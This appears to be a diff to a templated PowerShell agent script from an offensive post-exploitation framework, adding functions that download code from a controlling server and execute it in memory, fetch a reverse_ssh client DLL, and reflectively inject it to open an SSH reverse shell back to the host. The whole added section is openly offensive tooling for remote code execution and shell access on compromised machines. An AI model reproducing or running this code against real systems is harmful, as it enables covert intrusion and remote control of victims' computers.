@@ -869,6 +869,73 @@ Unmount the Webdav drive.
 }
 
 
+{% if not minimal -%}
+function Get-BuiltinModule {
+    Param(
+        [parameter(Mandatory=$True)] [String]$Name
+    )
+    $transport_args = @{"m"=$Name}
+    $code = Transport-String "module" $transport_args
+
+    $sb = [Scriptblock]::Create($code)
+    New-Module -ScriptBlock $sb | Out-Null
+
+    if ($?){
+        Write-Verbose ("{0} imported." -f $Module.Name)
+    } else {
+        Write-Error ("Failed to import {0}" -f $Module.Name)
+    }
+}
+
+
+function Get-RSSHClientDLL {
+<#
+.SYNOPSIS
+
+Load the client.dll of the reverse_ssh project.
+#>
+    $transport_args = @{"arch"="x64"}
+    $code = Transport-String "rssh" $transport_args $True
+
+    # TODO convert from bytes
+    if ($code -eq "now_building") {
+        throw "client.dll is now being built. Try again later."
+    }
+
+    if ($code -eq "still_building") {
+        throw "client.dll is still being built. Try again later."
+    }
+
+    if ($code -eq "error") {
+        throw "Error while retrieving client.dll; check server logs."
+    }
+
+    return $code
+}
+
+
+function Invoke-ReverseShell {
+<#
+
+.SYNOPSIS
+
+Create a reverse shell back to the host. (Proxies currently not supported.)
+
+.DESCRIPTION
+
+This Cmdlet leverages the reverse_ssh project written in golang
+(https://github.com/NHAS/reverse_ssh) to create an SSH based reverse shell.
+
+The host must be reachable directly without any proxy.
+
+#>
+    Get-BuiltinModule "Invoke-ReflectivePEInjection"
+    $DLLBytes = Get-RSSHClientDLL  # TODO consider arch
+    Invoke-ReflectivePEInjection -PEBytes $DLLBytes
+}
+{% endif %}
+
+
 function Get-SysInfo {
 <#
 .SYNOPSIS
